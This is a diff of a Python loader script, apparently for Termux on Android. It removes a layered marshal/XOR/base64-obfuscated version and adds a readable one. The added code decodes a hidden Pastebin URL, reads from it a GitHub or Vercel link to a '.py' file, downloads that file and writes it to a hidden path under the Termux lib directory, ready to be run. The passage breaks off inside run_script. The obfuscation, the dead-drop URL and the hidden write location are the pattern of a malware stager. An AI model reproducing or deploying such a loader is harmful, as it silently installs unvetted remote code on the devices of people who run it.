@@ -1,92 +1,105 @@
-# encrypetd: Vindra Ganzz
-def __merge_dicts__(_a, *_parts):
-    result = {}
-    if isinstance(_a, dict):
-        result.update(_a)
-    for p in _parts:
-        result.update(p)
-    return result
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-def __xor_bytes__(data, key):
-    return bytes((b ^ key[i % len(key)] for i, b in enumerate(data)))
-os = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('fa7FGg=='), bytes.fromhex('a7acaa698c587fc4becdf7fe96e0318b'))))())
-re = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('SSaCLA=='), bytes.fromhex('9324f049b3ff1ed054d29e833968d139'))))())
-sys = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('2UaXePE='), bytes.fromhex('0345e40182efa5986f8a2608ed4bb3f6'))))())
-base64 = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('9AjKnAsoDQM='), bytes.fromhex('2e0ea8fd784d3b370dd46cee3485b33e'))))())
-_XNoY0Az4 = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('bD1G8wgTuSVvWKyoxqgj+Q=='), bytes.fromhex('b6333381647fd047412ac9d9b3cd508d'))))(), fromlist=[(lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('BrEqZ35UYRat'), bytes.fromhex('fcb658020f210465d99700d503e50bd9'))))()])
-urllib = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('OtmttE1V5Bk='), bytes.fromhex('c0dfd8c621398d7b5067614f237e1728'))))())
-_x8f7rXgH = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('VIK+oauM3kU5JT/wDmc='), bytes.fromhex('8e8ecbd3c7e0b72717404d826115f3fe'))))(), fromlist=[(lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('eUbX/NCZRQ=='), bytes.fromhex('8343b28ea2f63704df2e01c1ae5602a6'))))()])
-urllib = __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('vsPM9/PB22c='), bytes.fromhex('44c5b9859fadb20577e975a7d1216d79'))))())
-ENCODED_PASTEBIN = (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('B6owS3rhHgYDFwtOHhYc2rO2C1RioR8ne0slBRcXJu+7tR0xcocrCgx5ElxpCg=='), bytes.fromhex('fd86510328d17d4e4e21473727614582'))))()
-ENCODED_PATH = (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('4zN5kqC2O7fJ/BuH6lOAfCBhV5LCqzu32vMjmPpXlR1De1fnpKQTw9rwIqmVELh4UH15y6CnBqGxtw=='), bytes.fromhex('190b35a0f2de5ff08c8a41c0ac63d92f'))))()
+import os
+import re
+import sys
+import base64
+import urllib.request
+import urllib.error
+
+ENCODED_PASTEBIN = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2ZVVDBXUkNk"
+ENCODED_PATH     = "L2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvLkRyYQ=="
+
 
 def decode_base64(s):
     try:
-        return getattr(getattr(base64, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('l8EBPtjA34gB'), bytes.fromhex('4dc66c5faab3b7e96d40dc861f2341ec'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('624a3egzxYQ='), bytes.fromhex('316878bc9b56f3b0c70aadc05b70e0ed'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('7wSorAT7u6RhSvzPqnfzS3Yp'), bytes.fromhex('151498e46993efe9331abebe9920bb7e'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('LIB8JVTBoFwYS4GbGg9yrLXFLn1Uk6VdSxPfkxFfcP20kg=='), bytes.fromhex('d6a04c4463f1c36f2f2ae7ab286d449f'))))()))))())(s), (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('OiJW2U+PUNhe'), bytes.fromhex('e0253bb83dfc38b9323b31b2892e7aef'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Yx9x0Xz+zac='), bytes.fromhex('b91913b00f9bfb93408ca33e531bb718'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('PVuEu3BgmMGgR+xA45I='), bytes.fromhex('c757d6cc1a2de890c5729f17aeafe39f'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('2vypGCXpsSdpCxALYR6pxhDqqR5zuOEnbA1EWTIa/MIQ5Q=='), bytes.fromhex('20dc907c158cd01f0a3b263f0528cdf3'))))()))))())()
+        return base64.b64decode(s).decode()
     except Exception:
         return ''
 
+
 def http_get(url, timeout=15):
-    (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('B8rZVdEvgfd/Jy2x4/Om+qLr5FTAdtP7MGsnmuD+p+yOoaUQ7jOB8DIvC7bn9f7Imu3lRIU7lPgtLyqs5ua4qcm4uB4='), bytes.fromhex('fd888b30a55af3995f0f5ec58287d389'))))()
-    req = getattr(getattr(urllib, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ptYSuy+Dhlgi'), bytes.fromhex('7cd17fda5df0ee394ef137adcd4cd364'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('LKQeNfKPQ7Y='), bytes.fromhex('f6a27c5481ea75828ffa7da4638bf63e'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('CI5jefx+HCsI4zjaY3I='), bytes.fromhex('f282522baa146d715b950db3530735b5'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('CAmIWic1nT8h6kjyClj1qMdMjV11Msk6cr1P8gsNqanAHA=='), bytes.fromhex('f229b83c1607ac0e42892dc76e39cd9b'))))()))))()), (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ZL4HTxByPtL7'), bytes.fromhex('beb96a2e620156b397698f658a964f0f'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('1j4ckldyzzQ='), bytes.fromhex('0c387ef32417f900089ecfada3e48ff7'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('QIJ0j3hWlKQbaFlkESw='), bytes.fromhex('ba8e43b93e12d5ca520e0c2d521c59d9'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('J9Ft0vlctVcgDjU5b/miDbvCPdf6DLRQclg2aWj7qQDqlw=='), bytes.fromhex('ddf15ee7986a84661639050a59989138'))))()))))())(url, headers={(lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('lZxk+311z/ToTqHz'), bytes.fromhex('6f9631881807e2b58f2bcf873ad7600f'))))(): (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('onYnyyt4NUeg2+KEoqI69TFwH9xqMRhFpYa4w/aiI4lxPivUIX08fKSWnMPmrSeKbzBZknE5EmOVuZuGsu570j0+LcEyejYC4be/2P3vd5ZpLFqKYTEURKOdu8+y0XPfOWwDi2QibgXywg=='), bytes.fromhex('581e6aa45111592bc1f4d7aa928212b9'))))(), (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('1tvzIpw3j7o='), bytes.fromhex('2cddb241ff52ffce50f6c8d372f950ff'))))(): (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('41x/aSo='), bytes.fromhex('195f5546009274ed026b6050131d276b'))))()})
+    """Return (status_code, body_bytes). Kirim User-Agent agar tidak 403."""
+    req = urllib.request.Request(
+        url,
+        headers={
+            'User-Agent': ('Mozilla/5.0 (Linux; Android 10) '
+                           'AppleWebKit/537.36 (KHTML, like Gecko) '
+                           'Chrome/120.0 Mobile Safari/537.36'),
+            'Accept': '*/*',
+        },
+    )
     try:
-        with getattr(getattr(urllib, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('KNK7rLdPwZ83'), bytes.fromhex('f2d5d6cdc53ca9fe5b027f85b213ec9e'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('H19T7+auZRI='), bytes.fromhex('c559318e95cb5326c251a427d043893f'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('gyGntpGLlaHx85FL4FQ='), bytes.fromhex('792dc8d0a9c0a4eaa1c6d21db702530f'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('5aPXtmkrkh88QzPz7eHGjy21heU4dsdCbxdj8+y7ktQr5Q=='), bytes.fromhex('1f83e0d40f13a5275e7257c1d582f0ec'))))()))))()), (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('hLOTDNJL8fwE'), bytes.fromhex('5eb4fe6da038999d683fc6ba592bdfc4'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Ph9We/Bv75Q='), bytes.fromhex('e419341a830ad9a05fab66df02a03e70'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Uc0dhpnDWIEiW0cKtnw='), bytes.fromhex('abc14ea9cf852fe313707e44f90c4404'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('hfjMzRb5CLACSkHlVQ+o2h3ulstB/w61BkBH4gZcot9IvQ=='), bytes.fromhex('7fd8f5fc70cb3b80607925d4643e90ee'))))()))))())(req, timeout=timeout) as r:
-            return (getattr(r, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('eyw1AtcCRopJ'), bytes.fromhex('a12b5863a5712eeb250ed6ed1055409c'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('vMhYr08X7O4='), bytes.fromhex('66ce3ace3c72dadac4c184910986f490'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('qJo/ydFRwOv03XAdL5k='), bytes.fromhex('529659f0ab028a81cd8e216766a496c8'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('uJhDW9Bl9X3Zvh5UndHMLHaJQQuDNKx91e0YCZ7XnXh63Q=='), bytes.fromhex('42b8226eb404944cec8c2b31afe7ff1a'))))()))))()), getattr(r, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('H3fFjI9uWauu'), bytes.fromhex('c570a8edfd1d31cac2ec2fd1bef641b9'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('emmxZDqvOM8='), bytes.fromhex('a06fd30549ca0efb4201a4567dd9301a'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Cz6Dblj3KaBbqw=='), bytes.fromhex('f136c21b08dc7dda33fb318ab0be595e'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Hr+LC3bjR6cRfBNTf9K6ZYGsigsj5hynFCwUWHuFumCGqQ=='), bytes.fromhex('e49fef3313d47fc4231d266a4db08304'))))()))))())())
-    except getattr(getattr(urllib, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('BQdgdgUS3wMs'), bytes.fromhex('df000d177761b76240be50f741cab9f7'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('O1r+hblH9d8='), bytes.fromhex('e15c9ce4ca22c3ebe627a095647a27d7'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('INPoppVmc1476Jgbn08='), bytes.fromhex('dadf9dffd732392e50a3cf7ca2725b0b'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('/wp1rVu3sQdYHKD19b3KXjNLJ68Cu7sDCR/9oqDuzFRmSQ=='), bytes.fromhex('052a439e638282316d28c597c388f866'))))()))))()), (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Za2F8t7GxvD5'), bytes.fromhex('bfaae893acb5ae91951de2719c4aa07e'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Z+yGaWs2KUQ='), bytes.fromhex('bdeae40818531f7077d674c70ad83ca4'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('kk8uQ+RjXBeVu9FTRpFn2Bti'), bytes.fromhex('685f6b3587350a72d1ebb50570c734b9'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('30Ti+R3xyRFn3QgQUa8EDRcH5PZJophMMtlcHF/7AlhBUA=='), bytes.fromhex('256481c17b94fc7557ec6a2468c9373d'))))()))))()) as e:
-        return (getattr(e, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('gI0CLzy2p8tw'), bytes.fromhex('5a8a6f4e4ec5cfaa1c8da6b5ea2dcf76'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('xyJTt3gvZLQ='), bytes.fromhex('1d2431d60b4a5280bb3b30573901e71a'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('rCAtnL64GXRkmA=='), bytes.fromhex('56286ef1f2f96e4217e9dd1494dc3b7b'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('CLlGl4//ddgljYL2egA13pD/QMKIqHHSINfVqX0FM9XGrg=='), bytes.fromhex('f29922a7b9c914eb44eee1904e6607ec'))))()))))()), b'')
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status, r.read()
+    except urllib.error.HTTPError as e:
+        return e.code, b''
     except Exception:
-        return (0, b'')
+        return 0, b''
+
 
 def fetch_script():
     pastebin_url = decode_base64(ENCODED_PASTEBIN)
-    script_path = decode_base64(ENCODED_PATH)
+    script_path  = decode_base64(ENCODED_PATH)
+
     if not pastebin_url or not script_path:
-        print((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('dfwpNlUeQLrUwKu2BMdLKsSOSlkxmf1RleKYiA=='), bytes.fromhex('80eb293655fcdd36f485f9e44b95710a'))))())
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('lsvINa7gzMuz'), bytes.fromhex('4ccca554dc93a4aadf9e011adaf25f40'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('L5m4c8Z11/w='), bytes.fromhex('f59fda12b510e1c8089ebfcf33506eee'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('JRqY1J7a4xa5ZA=='), bytes.fromhex('df12dc8ed2a28425f334d172b7849e37'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('kMA5lBAYj+tp9fID+4gPngzQaptPHtK+bPH7Vq2MB5sM1w=='), bytes.fromhex('6ae05da3292eb6df0f97c361c8ea3efd'))))()))))())(1)
-    getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('tQQ4iVXkgUa9'), bytes.fromhex('6f0355e82797e927d1979d9c33db3551'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('8QnMKj5AFz0='), bytes.fromhex('2b0fae4b4d2521091dc5d99fe0b878aa'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Qomyrmp4qaod3EAFHcI='), bytes.fromhex('b88582e30d33fff04bbe2f4e7eff288c'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('FKEKCs5GIycNAcMeFyPwY43gDF+cFnF4D1eUTBd38mTctw=='), bytes.fromhex('ee813a6bad23141e3f62a62825459356'))))()))))())(f'''mkdir -p "{getattr(getattr(os, (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('22OqbOqy'), bytes.fromhex('0167da0d9eda27c8bffe3cd2498c64e1'))))()), (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('+D1GcT9cB/J9'), bytes.fromhex('223a22184d32669f184927d64bc26f32'))))())(script_path)}"''')
+        print("❌ ERROR: Decode gagal")
+        sys.exit(1)
+
+    os.system(f'mkdir -p "{os.path.dirname(script_path)}"')
     try:
-        getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('UA0nv9lWfMbU'), bytes.fromhex('8a0a4adeab2514a7b861f9630edacba5'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ksHkcYGESs4='), bytes.fromhex('48c78610f2e17cfa88609bd9638222fb'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('i7Y8Aq/84AnY8x6yD4o='), bytes.fromhex('71ba7678d5b2ad7db9dc2ae646b77e3a'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('i+dRdQDY+wwmxbseRzUkTETwAiRR3PpaKsLtHhthLkJDoQ=='), bytes.fromhex('71c7371133b9996a13f2d97c23051d7b'))))()))))())(script_path)
+        os.remove(script_path)
     except OSError:
         pass
+
     status, body = http_get(pastebin_url)
     if status != 200:
-        print(f'❌ ERROR: Fetch HTTP')
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('383880R6rbcb'), bytes.fromhex('05ca91923609c5d67755be91f28ee394'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('xyrLMF8fSf4='), bytes.fromhex('1d2ca9512c7a7fcae94a0aa707f4093f'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('XrIV68M0J+GiBw=='), bytes.fromhex('a4ba7492f24e42ad9228ccef57659a8e'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('BqVBOOenelKbqZICsiCNS8+yR2vhqnMBn/uXUuQj3BzNtQ=='), bytes.fromhex('fc852309d59e4b64ab99f6368642ba28'))))()))))())(1)
-    github_url = getattr(getattr(body, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ZFQU7Zuwuvn1'), bytes.fromhex('be53798ce9c3d29899aac168d28c42c9'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('hJ4PK5+tV90='), bytes.fromhex('5e986d4aecc861e97d35f8fa00471668'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('0KWD09F52mC3Fzzkoh0='), bytes.fromhex('2aa9ecf89603b424f67569b596200074'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('oOgNmzrNqo+K63a1GZVZL2yqDZM7y6yL3eVysUiQDC1tqg=='), bytes.fromhex('5ac83aa25ffaceb8ecd243862ea16a1a'))))()))))())(errors=(lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('tN9gbufkOSpM'), bytes.fromhex('4ed8120b9788584929f0631cd6ea827a'))))()), (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('zTw0iYus7Ynp'), bytes.fromhex('173b59e8f9df85e885152fd36c393362'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('W4ZZ3CD/tfU='), bytes.fromhex('81803bbd539a83c1839bd07e26adaec0'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('oLESCD64KReWdjrx6PU='), bytes.fromhex('5abd63626e804525c25d03b0d5c8e8b2'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('chEA1xSvJCB1a9ANZ/Ca4uxUD9YV/yUnJ2yHXm71x7CwAg=='), bytes.fromhex('883137e727991c461058e13b5ec7a2d6'))))()))))())()
-    if not (getattr(re, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('FXEGGpRkHqe+'), bytes.fromhex('cf766b7be61776c6d2f41b72bdc37efa'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('RV63rkDA/AE='), bytes.fromhex('9f58d5cf33a5ca35c7777dbcd6dd1ed7'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('kh9wybKDWMipoirLygg='), bytes.fromhex('681338a3e4e23db0d994639af735427f'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Uonea6KmIIkGXHxNLOCvtpGaiz2o9XGMAVgvTS/preqRyA=='), bytes.fromhex('a8a9bd5f919613be373d4a281dd99b8f'))))()))))())((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('0mTSrV6smYjf24tkJgwLaE8h+K1fupyIgIbHeSkPMihcFKKmRbXG1c6oimY+Xw=='), bytes.fromhex('28488cc52ad8e9fbe5f4a416477b5746'))))(), github_url) or getattr(re, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('9dSSZhKGLi2d'), bytes.fromhex('2fd3ff0760f5464cf1fcf7ceeb87bdb3'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('6hirfGoJz28='), bytes.fromhex('301ec91d196cf95bc55f981c50756b20'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('m/v9NtTX03xTxjwXkN8='), bytes.fromhex('61f7b061a4a595391b840970ade205a0'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('LHaYc/DM7wSdP/AzWMx9Fu5unCWkn+oCy2uiN13OIUDlNQ=='), bytes.fromhex('d656fd11c6aadf32aa0ac30639fe4573'))))()))))())((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('RKC88UEnN6q0AIOPqx+whuKtlPxHMCK10gHNpIUfw4birZLgEQ=='), bytes.fromhex('be83e299355347d98e2facd4f530edad'))))(), github_url)):
-        print((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('PjVsWV9JQo+3O0wKyDeRAZ59IHkrwrti/F5oOesMzw=='), bytes.fromhex('cb2f6c595fabdf03977e1e588765ab21'))))())
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('KsZFFkwSRT4O'), bytes.fromhex('f0c128773e612d5f62e9d9bd0e5a88bf'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('jZ/VSJEHBEQ='), bytes.fromhex('5799b729e2623270cc8f098bba01fce6'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('NoVSGejAn8XdKg=='), bytes.fromhex('cc8d0329a1a3feeebe6b1106d02c0593'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('QpqBBqwXJ54Mk609SMKS79qKjgz+FSiQCsSmak2Vk7+M2A=='), bytes.fromhex('b8bab83f982110a73da095587ff6f68c'))))()))))())(1)
+        print(f"❌ ERROR: Fetch HTTP")
+        sys.exit(1)
+    github_url = body.decode(errors='replace').strip()
+
+    if not (re.match(r'^https://raw\.githubusercontent\.com/.+\.py$', github_url) or
+            re.match(r'^https://[^/]+\.vercel\.app/.+\.py$', github_url)):
+        print("❌ ERROR: URL tidak valid")
+        sys.exit(1)
+
     status, body = http_get(github_url)
     if status != 200:
-        print(f'❌ ERROR: HTTP {status} (file tidak ditemukan)')
+        print(f"❌ ERROR: HTTP {status} (file tidak ditemukan)")
         try:
-            getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('ZWeQXWB/RaF1'), bytes.fromhex('bf60fd3c120c2dc019bbccfb99bd43ac'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('4gHg+FEDxMo='), bytes.fromhex('380782992266f2fe110df10cfa97fd73'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('mY8Od+gYCvjYaDZQLGM='), bytes.fromhex('63833930a64d78d3e12f5e22615e7d04'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('HjzPNwvX4khNKGwlyuJnkYAqzWNY17NIHC9lJc7rMJfRfg=='), bytes.fromhex('e41cfc013de2d07e2e495417f8db01a1'))))()))))())(script_path)
+            os.remove(script_path)
         except OSError:
             pass
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('KVLS9G2h5hwZ'), bytes.fromhex('f355bf951fd28e7d75e69d4f8279e91a'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('bLUhkICc7Jg='), bytes.fromhex('b6b343f1f3f9daac50b777572cbbcd64'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('cDOKDQWQ9zBJvg=='), bytes.fromhex('8a3bdf7a4ad2c3411f886c39b8630457'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('CH0Xh1YIqH3t1qc6MEVZ+ZBoHI1RWfgo4Y+ibzBFXfPCOQ=='), bytes.fromhex('f25d2fbe663fcd49d4b7c459002069c1'))))()))))())(1)
+        sys.exit(1)
+
     try:
-        with open(script_path, (lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('18p47Q=='), bytes.fromhex('2dc80f8fcab4c301dc8f6fcd2d7d8631'))))()) as f:
-            getattr(f, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('uQRS0dV7xiFY'), bytes.fromhex('63033fb0a708ae403463e0d5c0075c6e'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('vaOdBent0oE='), bytes.fromhex('67a5ff649a88e4b5cbb11804661505f8'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('pZET0bALPS0N3wj7wv0='), bytes.fromhex('5f9d25e18451556360877f8cffc0b6ec'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('2zRndoLBivHR4Q8MLyvIYBQjMnSHx9qjhe9YDn16kGcScQ=='), bytes.fromhex('21145447b6a3bc94b7d76d3c4a18a956'))))()))))())(body)
+        with open(script_path, 'wb') as f:
+            f.write(body)
     except OSError as e:
-        print(f'❌ ERROR: Gagal simpan script')
-        getattr(sys, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('Yxs4UJkIzeji'), bytes.fromhex('b91c5531eb7ba5898e0970e462914449'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('c7w/TkBF8KM='), bytes.fromhex('a9ba5d2f3320c6974e3a60f5ecba887c'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('2kXfEdtEGcXF5Q=='), bytes.fromhex('204d8973bf3e4bf5bca07b4d07f6649e'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('pyBD7WeHG6x0Jv31CgMQim03HulmhRiiJXP89lxRT9ppMg=='), bytes.fromhex('5d007b8b05b42a9a4740cfc06c3329b9'))))()))))())(1)
+        print(f"❌ ERROR: Gagal simpan script")
+        sys.exit(1)
+
 
 def run_script():
     script_path = decode_base64(ENCODED_PATH)
-    if getattr(os, (lambda: __import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('luN/kbnu5gr9'), bytes.fromhex('4ce412f0cb9d8e6b91c589b9f901553b'))))()).loads(__xor_bytes__(__import__((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('RFHhsab8yzM='), bytes.fromhex('9e5783d0d599fd0768c84c91d5136094'))))()).b64decode((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('HL75lQjN40TxtZ8b29Q='), bytes.fromhex('e6b2b1d363ac901081e4b45f9ae964a3'))))()), bytes.fromhex((lambda: __import__('marshal').loads(__xor_bytes__(__import__('base64').b64decode('C9Z2oYJL4qv/HHCDPOg14cSSJ/aCTuCh+kV1imvuPLzFwA=='), bytes.fromhex('f1f61597b72dd4929c2444ba0edc0c85'))))()))))())((lambda: 